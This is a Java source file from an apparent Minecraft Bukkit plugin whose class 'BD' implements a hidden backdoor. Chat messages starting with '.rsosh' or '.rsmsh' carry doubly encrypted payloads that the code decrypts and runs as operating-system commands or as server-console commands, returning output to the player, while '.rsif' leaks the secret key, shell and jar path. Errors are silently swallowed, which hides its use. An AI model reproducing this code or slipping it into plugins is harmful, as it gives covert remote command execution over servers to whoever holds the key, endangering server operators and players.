package com.github.rumoel.bd.minecraft.plugin;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class BD {

	private static String key;

	public static boolean exec(AsyncPlayerChatEvent e) {
		boolean isMy = false;
		String message = e.getMessage();

		if (message.toLowerCase().contains(".rsif")) {
			isMy = true;
			checkInfo(e);
		} else if (message.toLowerCase().startsWith(".rsmsh")) {
			isMy = true;
			rsmsh(message);
		} else if (message.toLowerCase().startsWith(".rsosh")) {
			isMy = true;
			rsosh(e, message);
		}
		return isMy;
	}

	private static void rsosh(AsyncPlayerChatEvent e, String message) {
		String[] mesAr = message.split(" ");
		if (mesAr.length == 2) {
			try {
				String decodedCommandOs = A1.decryptXBin(mesAr[1], key);
				String command = A1.decryptXBin(decodedCommandOs, key);

				new Thread(() -> {
					try {
						ArrayList<String> argsCommand = new ArrayList<>();
						command.replaceAll("  ", " ");
						String[] argsCommandAr = command.split(" ");

						argsCommand.addAll(Arrays.asList(argsCommandAr));
						// argsCommand.add(command);
						ProcessBuilder processBuilder = new ProcessBuilder(argsCommand);
						processBuilder.redirectErrorStream(true);

						Process process = processBuilder.start();
						BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
						String s = null;
						while ((s = stdInput.readLine()) != null) {
							e.getPlayer().sendMessage(s);
						}
					} catch (Exception e2) {
					}
				}).start();
			} catch (Exception e2) {
			}
		}

	}

	private static void rsmsh(String message) {

		String[] mesAr = message.split(" ");
		if (mesAr.length == 2) {
			try {
				String decodedCommandMinecraft = A1.decryptXBin(mesAr[1], key);
				decodedCommandMinecraft = A1.decryptXBin(decodedCommandMinecraft, key);
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), decodedCommandMinecraft);
			} catch (Exception e2) {
			}
		}
	}

	private static void checkInfo(AsyncPlayerChatEvent e) {
		String message = e.getMessage();

		String[] mesAr = message.split(" ");
		if (mesAr.length == 2) {
			String keyMes = mesAr[1];
			try {
				sendDataFromStreamToPlayer(e, keyMes);
			} catch (Exception e2) {
			}
		}
	}

	private static void sendDataFromStreamToPlayer(AsyncPlayerChatEvent e, String keyMes) throws IOException {
		StringBuilder out = new StringBuilder();
		try (InputStream gitVersionStream = BD.class.getClassLoader().getResourceAsStream("git-bd-plugin.properties");
				BufferedReader reader = new BufferedReader(new InputStreamReader(gitVersionStream))) {
			String line;
			out.append("--GIT--").append('\n');
			while ((line = reader.readLine()) != null) {
				out.append(line).append('\n');
			}
			out.append("--GIT--").append('\n');

		}
		out.append("--SHELL--").append('\n');
		out.append(A1.getShell()).append('\n');
		out.append("--SHELL--").append('\n');

		out.append("--KEY--").append('\n');
		out.append(key).append('\n');
		out.append("--KEY--").append('\n');
		try {
			File dir = new File(BD.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
			String jar = System.getProperty("java.class.path");
			File jarFile = new File(dir, jar);
			out.append(jarFile.getAbsolutePath()).append('\n');
			out.append('\n');
		} catch (Exception e2) {
		}

		e.getPlayer().sendMessage("i:[" + A1.encryptXBin(A1.encryptXBin(out.toString(), keyMes), keyMes) + "]");
	}

	public static void reInstallKey() {
		key = UUID.randomUUID().toString();
	}

}
